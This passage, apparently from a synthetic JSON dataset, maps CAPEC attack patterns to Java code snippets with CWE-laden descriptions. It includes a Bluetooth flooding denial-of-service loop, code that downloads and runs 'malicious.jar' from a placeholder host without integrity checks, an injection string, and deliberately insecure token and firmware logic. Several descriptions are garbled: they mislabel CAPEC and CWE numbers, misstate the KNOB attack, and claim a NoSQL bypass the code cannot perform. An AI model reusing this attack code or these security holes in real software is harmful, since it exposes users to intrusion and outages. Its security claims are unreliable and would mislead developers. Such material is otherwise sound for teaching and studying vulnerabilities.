        "code_snippet": "import java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\n\npublic class ThunderboltExploit {\n    private static final String FIRMWARE_PATH = \"/path/to/thunderbolt/firmware.bin\";\n    private static final String MALICIOUS_FIRMWARE = \"/path/to/malicious/firmware.bin\";\n\n    public static void main(String[] args) {\n        try {\n            // CWE-1188: Initialization of a Resource with an Insecure Default\n            byte[] firmware = Files.readAllBytes(Paths.get(FIRMWARE_PATH));\n            if (isInsecureDefault(firmware)) {\n                // CWE-345: Insufficient Verification of Data Authenticity\n                if (!verifyFirmwareAuthenticity(firmware)) {\n                    // CWE-353: Missing Support for Integrity Check\n                    if (!checkFirmwareIntegrity(firmware)) {\n                        // CWE-288: Authentication Bypass Using an Alternate Path or Channel\n                        if (bypassAuthentication()) {\n                            // CWE-862: Missing Authorization\n                            if (!isAuthorized()) {\n                                // Exploit: Replace firmware with malicious version\n                                Files.write(Paths.get(FIRMWARE_PATH), Files.readAllBytes(Paths.get(MALICIOUS_FIRMWARE)));\n                                System.out.println(\"Firmware replaced with malicious version.\");\n                            }\n                        }\n                    }\n                }\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static boolean isInsecureDefault(byte[] firmware) {\n        // Check if firmware is using insecure default settings\n        return true; // Simulated check\n    }\n\n    private static boolean verifyFirmwareAuthenticity(byte[] firmware) {\n        // Verify the authenticity of the firmware\n        return false; // Simulated failure\n    }\n\n    private static boolean checkFirmwareIntegrity(byte[] firmware) {\n        // Check the integrity of the firmware\n        return false; // Simulated failure\n    }\n\n    private static boolean bypassAuthentication() {\n        // Bypass authentication mechanism\n        return true; // Simulated bypass\n    }\n\n    private static boolean isAuthorized() {\n        // Check if the action is authorized\n        return false; // Simulated unauthorized access\n    }\n}",
        "description": "This Java code snippet simulates an exploit of Thunderbolt protection flaws by leveraging multiple weaknesses (CWEs) as described in the CAPEC. The code reads the current Thunderbolt firmware, checks for insecure default settings (CWE-1188), fails to verify the authenticity (CWE-345) and integrity (CWE-353) of the firmware, bypasses authentication (CWE-288), and proceeds without proper authorization checks (CWE-862). If all these conditions are met, it replaces the firmware with a malicious version, demonstrating how an adversary could exploit these vulnerabilities to manipulate the Thunderbolt controller firmware."
    },
    {
        "capec_id": "666",
        "capec_name": "BlueSmacking",
        "code_snippet": "import javax.bluetooth.*;\nimport java.io.*;\nimport java.util.*;\n\npublic class BlueSmackingAttack {\n    public static void main(String[] args) throws IOException, BluetoothStateException {\n        LocalDevice localDevice = LocalDevice.getLocalDevice();\n        DiscoveryAgent agent = localDevice.getDiscoveryAgent();\n        Vector<RemoteDevice> devices = new Vector<>();\n\n        agent.startInquiry(DiscoveryAgent.GIAC, new DiscoveryListener() {\n            public void deviceDiscovered(RemoteDevice btDevice, DeviceClass cod) {\n                devices.add(btDevice);\n            }\n\n            public void inquiryCompleted(int discType) {\n                System.out.println(\"Device Inquiry Completed.\");\n            }\n\n            public void servicesDiscovered(int transID, ServiceRecord[] servRecord) {}\n\n            public void serviceSearchCompleted(int transID, int respCode) {}\n        });\n\n        try {\n            Thread.sleep(10000); // Wait for device discovery\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        }\n\n        for (RemoteDevice device : devices) {\n            try {\n                L2CAPConnection connection = (L2CAPConnection) Connector.open(\"btl2cap://\" + device.getBluetoothAddress() + \":1001\");\n                byte[] largePacket = new byte[65535]; // Large packet to flood\n                Arrays.fill(largePacket, (byte) 0xFF);\n\n                while (true) {\n                    connection.send(largePacket); // Flooding the device\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a BlueSmacking attack, where an adversary floods Bluetooth-enabled devices with large packets over the L2CAP protocol to create a Denial of Service (DoS). The code first discovers nearby Bluetooth devices and then attempts to establish an L2CAP connection to each discovered device. Once connected, it continuously sends large packets to flood the device. This attack leverages CWE-404 (Improper Resource Shutdown or Release) by overwhelming the target device's resources, potentially causing it to crash or become unresponsive. The code also indirectly touches on CWE-246 (J2EE Bad Practices: Direct Use of Sockets) by directly using L2CAP connections instead of higher-level abstractions."
    },
    {
        "capec_id": "667",
        "capec_name": "Bluetooth Impersonation AttackS (BIAS)",
        "code_snippet": "import javax.bluetooth.*;\nimport java.io.IOException;\n\npublic class BluetoothImpersonationAttack {\n    public static void main(String[] args) {\n        try {\n            LocalDevice localDevice = LocalDevice.getLocalDevice();\n            DiscoveryAgent agent = localDevice.getDiscoveryAgent();\n\n            // Simulate an adversary setting their device's MAC address to a trusted one\n            String trustedMacAddress = \"00:11:22:33:44:55\";\n            RemoteDevice trustedDevice = new RemoteDevice(trustedMacAddress) {\n                public String getFriendlyName(boolean alwaysAsk) {\n                    return \"TrustedDevice\";\n                }\n            };\n\n            // Attempt to authenticate with the trusted device\n            boolean authenticated = authenticateDevice(trustedDevice);\n            if (authenticated) {\n                System.out.println(\"Authenticated as trusted device!\");\n                // Perform malicious actions\n            } else {\n                System.out.println(\"Authentication failed.\");\n            }\n        } catch (BluetoothStateException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static boolean authenticateDevice(RemoteDevice device) {\n        // Weak authentication mechanism\n        try {\n            String deviceName = device.getFriendlyName(false);\n            return \"TrustedDevice\".equals(deviceName);\n        } catch (IOException e) {\n            e.printStackTrace();\n            return false;\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a Bluetooth Impersonation Attack (BIAS) by simulating an adversary who sets their device's MAC address to that of a trusted device. The code uses a weak authentication mechanism that only checks the device's friendly name, which can be easily spoofed. This embodies the main idea of CAPEC-290 (Authentication Bypass by Spoofing) and CWE-1390 (Weak Authentication). The code does not properly verify the source of the communication channel (CWE-940) and does not ensure the intent of the communication is from an authorized source (CWE-925), making it vulnerable to impersonation attacks."
    },
    {
        "capec_id": "668",
        "capec_name": "Key Negotiation of Bluetooth Attack (KNOB)",
        "code_snippet": "import javax.crypto.KeyGenerator;\nimport javax.crypto.SecretKey;\nimport javax.crypto.Cipher;\nimport java.security.SecureRandom;\nimport java.util.Arrays;\n\npublic class BluetoothKeyNegotiation {\n    public static void main(String[] args) throws Exception {\n        // Simulate key negotiation with low entropy\n        byte[] entropy = new byte[1]; // CWE-693: Insufficient entropy\n        SecureRandom random = new SecureRandom();\n        random.nextBytes(entropy);\n\n        KeyGenerator keyGen = KeyGenerator.getInstance(\"AES\");\n        keyGen.init(128, new SecureRandom(entropy)); // CWE-757: Algorithm Downgrade\n        SecretKey secretKey = keyGen.generateKey();\n\n        // Encrypt a sample message\n        Cipher cipher = Cipher.getInstance(\"AES/ECB/PKCS5Padding\");\n        cipher.init(Cipher.ENCRYPT_MODE, secretKey);\n        byte[] encryptedMessage = cipher.doFinal(\"Sensitive Data\".getBytes());\n\n        System.out.println(\"Encrypted Message: \" + Arrays.toString(encryptedMessage));\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable Bluetooth key negotiation process. The key negotiation uses low entropy (only 1 byte), making it susceptible to attacks (CWE-693: Protection Mechanism Failure). The key generation process uses a weak entropy source, which can be easily predicted or brute-forced by an attacker. Additionally, the code uses a fixed algorithm (AES with ECB mode), which is not the strongest available and can be considered an algorithm downgrade (CWE-757: Algorithm Downgrade). This setup can allow an adversary to decrypt the communication between two devices, embodying the main idea of the Key Negotiation of Bluetooth Attack (KNOB)."
    },
    {
        "capec_id": "669",
        "capec_name": "Alteration of a Software Update",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class SoftwareUpdate {\n    public static void main(String[] args) {\n        try {\n            URL updateUrl = new URL(\"http://example.com/update\");\n            HttpURLConnection connection = (HttpURLConnection) updateUrl.openConnection();\n            connection.setRequestMethod(\"GET\");\n\n            InputStream in = connection.getInputStream();\n            FileOutputStream out = new FileOutputStream(\"update.bin\");\n\n            byte[] buffer = new byte[1024];\n            int bytesRead;\n            while ((bytesRead = in.read(buffer)) != -1) {\n                out.write(buffer, 0, bytesRead);\n            }\n\n            in.close();\n            out.close();\n\n            // Simulate applying the update\n            applyUpdate(\"update.bin\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static void applyUpdate(String filePath) {\n        // Placeholder for update application logic\n        System.out.println(\"Applying update from \" + filePath);\n    }\n}",
        "description": "This Java code snippet demonstrates a basic software update mechanism that downloads an update file from a specified URL and applies it. The code is vulnerable to several issues highlighted by the CAPEC and related CWEs:\n\n1. **Alteration of a Software Update (CAPEC-1277)**: The update is downloaded from a URL without verifying its integrity or authenticity, making it susceptible to tampering by an adversary.\n2. **Embedded Malicious Code (CWE-506)**: The downloaded update file could contain malicious code if the source is compromised.\n3. **Reliance on Untrusted Inputs in a Security Decision (CWE-807)**: The code relies on the URL input for the update without validating its trustworthiness.\n4. **Exposure of Version-Control Repository to an Unauthorized Control Sphere (CWE-527)**: Although not directly shown, if the update URL points to a version control repository, it could expose sensitive information.\n5. **Reliance on Component That is Not Updateable (CWE-1329)**: If the update mechanism itself cannot be updated, any vulnerabilities in this code would persist.\n\nThe code represents the main idea of the CAPEC by showing how an adversary could exploit a software update mechanism to insert malicious code into an update, potentially gaining control over the software's functionality."
    },
    {
        "capec_id": "670",
        "capec_name": "Software Development Tools Maliciously Altered",
        "code_snippet": "public class MaliciousTool {\n    public static void main(String[] args) {\n        // CWE-506: Embedded Malicious Code\n        if (isMaliciousCondition()) {\n            executeMaliciousCode();\n        }\n\n        // CWE-733: Compiler Optimization Removal or Modification of Security-critical Code\n        // CWE-1037: Processor Optimization Removal or Modification of Security-critical Code\n        // Security-critical code that might be optimized away\n        if (isSecurityCritical()) {\n            performSecurityCheck();\n        }\n\n        // CWE-913: Improper Control of Dynamically-Managed Code Resources\n        String sensitiveData = \"Sensitive Information\";\n        manipulateSensitiveData(sensitiveData);\n\n        // CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n        System.out.println(\"System Info: \" + getSystemInfo());\n    }\n\n    private static boolean isMaliciousCondition() {\n        // Simulate a condition for malicious code execution\n        return true;\n    }\n\n    private static void executeMaliciousCode() {\n        System.out.println(\"Executing malicious code...\");\n        // Malicious actions here\n    }\n\n    private static boolean isSecurityCritical() {\n        // Simulate a security-critical condition\n        return true;\n    }\n\n    private static void performSecurityCheck() {\n        System.out.println(\"Performing security check...\");\n        // Security check actions here\n    }\n\n    private static void manipulateSensitiveData(String data) {\n        System.out.println(\"Manipulating: \" + data);\n        // Improperly controlled manipulation of sensitive data\n    }\n\n    private static String getSystemInfo() {\n        // Exposing sensitive system information\n        return \"OS: Windows, Version: 10.0.19041\";\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where a development tool has been maliciously altered, embodying the main idea of CAPEC-445. The code includes several vulnerabilities: \n1. CWE-506: Embedded Malicious Code - The `executeMaliciousCode` method is called under a malicious condition.\n2. CWE-733 and CWE-1037: Compiler and Processor Optimization Removal or Modification of Security-critical Code - The `performSecurityCheck` method represents security-critical code that might be optimized away.\n3. CWE-913: Improper Control of Dynamically-Managed Code Resources - The `manipulateSensitiveData` method improperly handles sensitive data.\n4. CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere - The `getSystemInfo` method exposes sensitive system information.\nThis code snippet illustrates how an adversary can embed malicious code and create vulnerabilities by altering development tools, leading to compromised software once deployed."
    },
    {
        "capec_id": "671",
        "capec_name": "Requirements for ASIC Functionality Maliciously Altered",
        "code_snippet": "public class ASICSecurityTokenManager {\n    private static final String SECRET_KEY = \"hardcodedSecretKey\"; // CWE-1297\n    private static final Map<String, String> securityTokens = new HashMap<>();\n\n    public static void main(String[] args) {\n        // Maliciously altered requirement: improper token generation (CWE-1270)\n        generateSecurityToken(\"user1\");\n        generateSecurityToken(\"user2\");\n\n        // Improper restriction of security token assignment (CWE-1259)\n        assignSecurityToken(\"user1\", \"adminToken\");\n\n        // Insecure security identifier mechanism (CWE-1294)\n        if (validateSecurityToken(\"user1\", \"adminToken\")) {\n            System.out.println(\"Access granted to user1\");\n        } else {\n            System.out.println(\"Access denied to user1\");\n        }\n    }\n\n    private static void generateSecurityToken(String user) {\n        // Incorrect token generation logic\n        String token = SECRET_KEY + user; // CWE-1270\n        securityTokens.put(user, token);\n    }\n\n    private static void assignSecurityToken(String user, String token) {\n        // Improper restriction of security token assignment\n        securityTokens.put(user, token); // CWE-1259\n    }\n\n    private static boolean validateSecurityToken(String user, String token) {\n        // Insecure security identifier mechanism\n        return securityTokens.get(user).equals(token); // CWE-1294\n    }\n}",
        "description": "This Java code snippet represents a simplified and vulnerable implementation of an ASIC security token management system. The code embodies the main idea of the CAPEC by demonstrating how an adversary could maliciously alter the requirements for ASIC functionality, leading to various security weaknesses. The code includes hardcoded secret keys (CWE-1297), improper token generation (CWE-1270), improper restriction of security token assignment (CWE-1259), and insecure security identifier mechanisms (CWE-1294). These vulnerabilities could result in an ASIC that does not meet the user's needs, contains malicious functionality, or exhibits anomalous behaviors."
    },
    {
        "capec_id": "672",
        "capec_name": "Malicious Code Implanted During Chip Programming",
        "code_snippet": "public class MaliciousChipProgram {\n    private static final int SECRET_REGISTER = 0xDEADBEEF;\n    private static final int CONTROL_REGISTER = 0xCAFEBABE;\n    private static final int SECURITY_TOKEN = 0x12345678;\n\n    public static void main(String[] args) {\n        // Malicious code implanted during chip programming\n        if (checkSecurityToken(SECURITY_TOKEN)) {\n            // Improper access control to registers\n            int sensitiveData = readRegister(SECRET_REGISTER);\n            // Expose sensitive information\n            System.out.println(\"Sensitive Data: \" + sensitiveData);\n            // Replicating malicious code\n            replicateMaliciousCode();\n        }\n    }\n\n    private static boolean checkSecurityToken(int token) {\n        // Improper restriction of security token assignment\n        return token == SECURITY_TOKEN;\n    }\n\n    private static int readRegister(int register) {\n        // Simulate reading from a memory-mapped I/O register\n        return register;\n    }\n\n    private static void replicateMaliciousCode() {\n        // Simulate replicating malicious code\n        System.out.println(\"Replicating malicious code...\");\n    }\n}",
        "description": "This Java code snippet simulates a scenario where malicious code is implanted during the chip programming phase. The code checks for a security token (CWE-1259) and, upon validation, improperly accesses a sensitive register (CWE-1262) to read sensitive data (CWE-1423). The sensitive data is then exposed by printing it to the console. Additionally, the code simulates the replication of malicious code (CWE-509). This snippet embodies the main idea of CAPEC-506 by demonstrating how an adversary can alter a chip's program logic to perform malicious actions when the chip is in operational use."
    },
    {
        "capec_id": "673",
        "capec_name": "Developer Signing Maliciously Altered Software",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class MaliciousSoftware {\n    public static void main(String[] args) {\n        try {\n            // CWE-494: Download of Code Without Integrity Check\n            URL url = new URL(\"http://example.com/malicious.jar\");\n            InputStream in = url.openStream();\n            Files.copy(in, Paths.get(\"malicious.jar\"), StandardCopyOption.REPLACE_EXISTING);\n            in.close();\n\n            // Load the downloaded JAR file (potentially malicious)\n            URLClassLoader classLoader = new URLClassLoader(new URL[]{new File(\"malicious.jar\").toURI().toURL()});\n            Class<?> clazz = classLoader.loadClass(\"com.example.MaliciousClass\");\n            Runnable maliciousCode = (Runnable) clazz.getDeclaredConstructor().newInstance();\n\n            // CWE-506: Embedded Malicious Code\n            // CWE-507: Trojan Horse\n            maliciousCode.run();\n\n            // CWE-215: Insertion of Sensitive Information Into Debugging Code\n            System.out.println(\"Debug: Sensitive information: \" + System.getenv(\"SECRET_KEY\"));\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where a developer inadvertently signs and distributes malicious software. The code downloads a JAR file from a remote location without verifying its integrity (CWE-494). It then loads and executes a class from the downloaded JAR, which could contain malicious code (CWE-506, CWE-507). Additionally, the code prints sensitive information for debugging purposes, which should not be present in production (CWE-215). This represents the CAPEC scenario where a developer unknowingly signs and distributes software that has been maliciously altered."
    },
    {
        "capec_id": "674",
        "capec_name": "Design for FPGA Maliciously Altered",
        "code_snippet": "public class FPGAMaliciousAlteration {\n    private static boolean isMalicious = false;\n\n    public static void main(String[] args) {\n        // Simulate FPGA configuration memory reload\n        reloadFPGAConfiguration();\n\n        // Check if the FPGA has been maliciously altered\n        if (isMalicious) {\n            executeMaliciousFunction();\n        } else {\n            executeNormalFunction();\n        }\n    }\n\n    private static void reloadFPGAConfiguration() {\n        // Simulate the alteration of FPGA configuration\n        isMalicious = true; // This would be done by an adversary\n    }\n\n    private static void executeMaliciousFunction() {\n        System.out.println(\"Executing malicious function...\");\n        // Malicious code that could impact system operation\n    }\n\n    private static void executeNormalFunction() {\n        System.out.println(\"Executing normal function...\");\n        // Normal FPGA operation\n    }\n}",
        "description": "This Java code snippet simulates the malicious alteration of an FPGA's configuration memory, embodying the main idea of the CAPEC. The `reloadFPGAConfiguration` method represents the adversary's action of altering the FPGA configuration to introduce a malicious function. The `isMalicious` flag is set to true to simulate this alteration. The `main` method checks this flag and executes either a malicious function or a normal function based on its value. This represents the potential impact on system operation due to the malicious alteration. The code also touches on related CWEs by demonstrating how an adversary could embed malicious code (CWE-506) and potentially degrade system redundancy or security-critical mechanisms (CWE-1037, CWE-733, CWE-1334, CWE-1247)."
    },
    {
        "capec_id": "675",
        "capec_name": "Retrieve Data from Decommissioned Devices",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\n\npublic class DecommissionedDeviceHandler {\n    private static final String SENSITIVE_DATA_FILE = \"sensitive_data.txt\";\n\n    public static void main(String[] args) {\n        // Simulate writing sensitive data to a file\n        writeSensitiveData(SENSITIVE_DATA_FILE, \"Sensitive Information\");\n\n        // Simulate decommissioning the device\n        decommissionDevice(SENSITIVE_DATA_FILE);\n    }\n\n    private static void writeSensitiveData(String filePath, String data) {\n        try (FileWriter writer = new FileWriter(filePath)) {\n            writer.write(data);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static void decommissionDevice(String filePath) {\n        try {\n            // Attempt to delete the file\n            Files.deleteIfExists(Paths.get(filePath));\n\n            // Simulate improper scrubbing by not securely deleting the file\n            // This leaves the data recoverable by adversaries\n            System.out.println(\"Device decommissioned, but data may still be recoverable.\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where sensitive data is written to a file and then the device is decommissioned without properly scrubbing the data. The `writeSensitiveData` method writes sensitive information to a file, and the `decommissionDevice` method attempts to delete the file but does not securely erase the data, leaving it potentially recoverable. This embodies the CAPEC idea of retrieving data from decommissioned devices and highlights related CWEs such as improper scrubbing of sensitive data (CWE-1266), insufficient data removal (CWE-1301), and cleartext storage of sensitive information (CWE-316)."
    },
    {
        "capec_id": "676",
        "capec_name": "NoSQL Injection",
        "code_snippet": "import com.mongodb.MongoClient;\nimport com.mongodb.client.MongoCollection;\nimport com.mongodb.client.MongoDatabase;\nimport org.bson.Document;\n\npublic class NoSQLInjectionExample {\n    public static void main(String[] args) {\n        MongoClient mongoClient = new MongoClient(\"localhost\", 27017);\n        MongoDatabase database = mongoClient.getDatabase(\"testdb\");\n        MongoCollection<Document> collection = database.getCollection(\"users\");\n\n        // User input that is not properly sanitized\n        String userInput = \"admin' || '1'=='1\";\n\n        // Vulnerable query construction\n        Document query = new Document(\"username\", userInput);\n\n        // Executing the query\n        Document user = collection.find(query).first();\n\n        if (user != null) {\n            System.out.println(\"User found: \" + user.toJson());\n        } else {\n            System.out.println(\"User not found\");\n        }\n\n        mongoClient.close();\n    }\n}",
        "description": "This Java code snippet demonstrates a NoSQL injection vulnerability in a MongoDB query. The code connects to a MongoDB database and constructs a query using user input without proper sanitization. The user input is directly embedded into the query, which can be exploited by an attacker to manipulate the query logic. In this example, the input 'admin' || '1'=='1' is used to bypass authentication by always evaluating the condition to true. This embodies the main idea of CAPEC-943, CAPEC-1286, and related CWEs, highlighting the risks of improper input validation and neutralization in NoSQL databases."
    },
    {
        "capec_id": "677",
        "capec_name": "Server Motherboard Compromise",
        "code_snippet": "import java.io.FileOutputStream;\nimport java.io.IOException;\n\npublic class MaliciousFirmwareUpdater {\n    private static final String FIRMWARE_PATH = \"/path/to/firmware.bin\";\n    private static final String MALICIOUS_PAYLOAD = \"malicious code\";\n\n    public static void main(String[] args) {\n        try {\n            // Simulate firmware update with malicious payload\n            updateFirmware(FIRMWARE_PATH, MALICIOUS_PAYLOAD);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static void updateFirmware(String firmwarePath, String payload) throws IOException {\n        try (FileOutputStream fos = new FileOutputStream(firmwarePath, true)) {\n            // Append malicious payload to firmware\n            fos.write(payload.getBytes());\n            System.out.println(\"Firmware updated with malicious payload.\");\n        }\n    }\n}",
        "description": "This Java code snippet simulates a firmware update process where a malicious payload is appended to the firmware file. The `updateFirmware` method takes the path to the firmware and the malicious payload as arguments, and writes the payload to the firmware file. This represents the CAPEC 'Server Motherboard Compromise' by demonstrating how malware can be inserted into a server motherboard's firmware. The code also touches on related CWEs: CWE-506 (Embedded Malicious Code) by embedding malicious code into the firmware, CWE-509 (Replicating Malicious Code) by potentially allowing the malicious code to spread, and CWE-497 (Exposure of Sensitive System Information) by potentially exposing sensitive information through the compromised firmware."
    },
    {
        "capec_id": "678",
        "capec_name": "System Build Data Maliciously Altered",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\n\npublic class BuildConfig {\n    private static final String CONFIG_PATH = \"/tmp/build_config.txt\";\n\n    public static void main(String[] args) {\n        try {\n            // CWE-426: Untrusted Search Path\n            String configData = new String(Files.readAllBytes(Paths.get(CONFIG_PATH)));\n            System.out.println(\"Loaded config: \" + configData);\n\n            // CWE-497: Exposure of Sensitive System Information\n            System.out.println(\"System temp directory: \" + System.getProperty(\"java.io.tmpdir\"));\n\n            // CWE-377: Insecure Temporary File\n            File tempFile = File.createTempFile(\"tempConfig\", \".txt\");\n            FileWriter writer = new FileWriter(tempFile);\n            writer.write(\"Temporary configuration data\");\n            writer.close();\n            System.out.println(\"Temporary file created at: \" + tempFile.getAbsolutePath());\n\n            // CWE-209: Generation of Error Message Containing Sensitive Information\n            throw new IOException(\"Simulated error with sensitive data: \" + configData);\n        } catch (IOException e) {\n            // CWE-209: Error message with sensitive information\n            System.err.println(\"Error: \" + e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates several vulnerabilities related to the CAPEC 'System Build Data Maliciously Altered'. The code reads a configuration file from an untrusted path (CWE-426), exposes sensitive system information (CWE-497), creates an insecure temporary file (CWE-377), and generates an error message containing sensitive information (CWE-209). The main idea is to show how the system build process can be misconfigured by altering build data and how these related weaknesses can be exploited."
    },
    {
        "capec_id": "679",
        "capec_name": "Exploitation of Improperly Configured or Implemented Memory Protections",
        "code_snippet": "public class MemoryProtectionExample {\n    private static final int PROTECTED_REGION_START = 0x1000;\n    private static final int PROTECTED_REGION_END = 0x2000;\n    private static final int UNPROTECTED_REGION_START = 0x2000;\n    private static final int UNPROTECTED_REGION_END = 0x3000;\n\n    private static byte[] memory = new byte[0x4000];\n\n    public static void main(String[] args) {\n        // Simulate writing to protected region\n        writeMemory(0x1500, (byte) 0xAA); // Should be protected but is not\n\n        // Simulate writing to unprotected region\n        writeMemory(0x2500, (byte) 0xBB); // Unprotected and writable\n\n        // Simulate reading from protected region\n        byte data = readMemory(0x1500); // Should be protected but is not\n        System.out.println(\"Data read from protected region: \" + data);\n    }\n\n    private static void writeMemory(int address, byte value) {\n        if (address >= PROTECTED_REGION_START && address < PROTECTED_REGION_END) {\n            System.out.println(\"Warning: Writing to protected memory region!\");\n        }\n        memory[address] = value;\n    }\n\n    private static byte readMemory(int address) {\n        if (address >= PROTECTED_REGION_START && address < PROTECTED_REGION_END) {\n            System.out.println(\"Warning: Reading from protected memory region!\");\n        }\n        return memory[address];\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where memory protection is improperly configured, allowing unauthorized read and write operations to a protected memory region. The `writeMemory` and `readMemory` methods simulate writing to and reading from memory, respectively. The code includes checks to identify when operations are performed on a protected memory region, but it does not enforce any actual protection, merely issuing warnings. This represents the main idea of CAPEC-Exploitation of Improperly Configured or Implemented Memory Protections, where an adversary can exploit such weaknesses to read/write data or inject malicious code. The related CWEs provide context for the types of improper configurations that can lead to such vulnerabilities."
    },
    {
        "capec_id": "680",
        "capec_name": "Exploitation of Improperly Controlled Registers",
        "code_snippet": "public class RegisterAccess {\n    private static final int LOCK_BIT = 0x1;\n    private int controlRegister = 0x0;\n    private boolean lockBitSet = false;\n\n    public void setControlRegister(int value) {\n        if (!lockBitSet) {\n            controlRegister = value;\n        } else {\n            System.out.println(\"Error: Control register is locked.\");\n        }\n    }\n\n    public void setLockBit() {\n        lockBitSet = true;\n    }\n\n    public void clearLockBit() {\n        lockBitSet = false; // CWE-1231: Improper Prevention of Lock Bit Modification\n    }\n\n    public int getControlRegister() {\n        return controlRegister;\n    }\n\n    public static void main(String[] args) {\n        RegisterAccess regAccess = new RegisterAccess();\n        regAccess.setControlRegister(0xFF);\n        regAccess.setLockBit();\n        regAccess.clearLockBit(); // Vulnerability: lock bit can be cleared\n        regAccess.setControlRegister(0xAA); // Vulnerability: control register can be modified after lock bit is cleared\n        System.out.println(\"Control Register: \" + regAccess.getControlRegister());\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified example of improper access control and lock bit management in a register interface. The `RegisterAccess` class contains a control register and a lock bit. The `setControlRegister` method allows setting the control register value only if the lock bit is not set. The `setLockBit` method sets the lock bit, while the `clearLockBit` method clears it, which is a vulnerability (CWE-1231) as it allows the lock bit to be modified after being set. This represents the main idea of CAPEC-Exploitation of Improperly Controlled Registers, where an adversary can exploit the improper access control and lock bit management to modify sensitive register values."
    },
    {
        "capec_id": "681",
        "capec_name": "Exploitation of Improperly Controlled Hardware Security Identifiers",
        "code_snippet": "public class SoCSystem {\n    private static final int ALLOWED_TOKEN = 12345; // Hardcoded token for simplicity\n\n    public static void main(String[] args) {\n        int token = generateSecurityToken();\n        if (isValidToken(token)) {\n            performSensitiveAction();\n        } else {\n            System.out.println(\"Access Denied: Invalid Token\");\n        }\n    }\n\n    private static int generateSecurityToken() {\n        // Incorrect token generation logic\n        return 54321; // This should be dynamically generated and securely managed\n    }\n\n    private static boolean isValidToken(int token) {\n        // Improper token validation\n        return token == ALLOWED_TOKEN;\n    }\n\n    private static void performSensitiveAction() {\n        System.out.println(\"Sensitive action performed.\");\n    }\n}",
        "description": "This Java code snippet demonstrates a System-on-Chip (SoC) security vulnerability where security tokens are improperly generated and validated. The `generateSecurityToken` method returns a hardcoded, incorrect token, and the `isValidToken` method checks this token against a hardcoded allowed token. This setup embodies the CAPEC's main idea of exploiting improperly controlled hardware security identifiers. The code is vulnerable to attacks because the security token mechanism is not correctly implemented, leading to potential unauthorized access to sensitive actions."
    },
    {
        "capec_id": "682",
        "capec_name": "Exploitation of Firmware or ROM Code with Unpatchable Vulnerabilities",
        "code_snippet": "public class FirmwareUpdate {\n    private static final boolean IS_UPDATEABLE = false;\n    private static final String FIRMWARE_VERSION = \"1.0.0\";\n\n    public static void main(String[] args) {\n        if (!IS_UPDATEABLE) {\n            System.out.println(\"Firmware version \" + FIRMWARE_VERSION + \" is not updateable.\");\n            // Potentially vulnerable code that cannot be patched\n            vulnerableFunction();\n        } else {\n            System.out.println(\"Firmware is updateable.\");\n            // Code to update firmware\n            updateFirmware();\n        }\n    }\n\n    private static void vulnerableFunction() {\n        // Simulate a vulnerability\n        System.out.println(\"Executing vulnerable function...\");\n    }\n\n    private static void updateFirmware() {\n        // Simulate firmware update process\n        System.out.println(\"Updating firmware...\");\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where a device's firmware is not updateable, embodying the main idea of CAPEC-Exploitation of Firmware or ROM Code with Unpatchable Vulnerabilities. The `IS_UPDATEABLE` flag is set to `false`, indicating that the firmware cannot be updated. The `vulnerableFunction` method simulates a vulnerable piece of code that cannot be patched due to the unpatchable nature of the firmware. This represents CWE-1277 (Firmware Not Updateable) and CWE-1329 (Reliance on Component That is Not Updateable). The code also includes a placeholder for a firmware update process, which is not executed in this scenario, highlighting the risk of unpatchable vulnerabilities."
    },
    {
        "capec_id": "690",
        "capec_name": "Metadata Spoofing",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class MetadataSpoofingExample {\n    public static void main(String[] args) {\n        try {\n            // CWE-494: Download of Code Without Integrity Check\n            URL url = new URL(\"http://example.com/malicious.jar\");\n            InputStream in = url.openStream();\n            FileOutputStream fos = new FileOutputStream(\"downloaded.jar\");\n\n            byte[] buffer = new byte[1024];\n            int bytesRead;\n            while ((bytesRead = in.read(buffer)) != -1) {\n                fos.write(buffer, 0, bytesRead);\n            }\n            fos.close();\n            in.close();\n\n            // CWE-348: Use of Less Trusted Source\n            // CWE-290: Authentication Bypass by Spoofing\n            // CWE-941: Incorrectly Specified Destination in a Communication Channel\n            // CWE-1230: Exposure of Sensitive Information Through Metadata\n            // Load the downloaded JAR file without verifying its integrity\n            URLClassLoader classLoader = new URLClassLoader(new URL[]{new File(\"downloaded.jar\").toURI().toURL()});\n            Class<?> clazz = classLoader.loadClass(\"com.example.MaliciousClass\");\n            Runnable maliciousCode = (Runnable) clazz.getDeclaredConstructor().newInstance();\n            maliciousCode.run();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
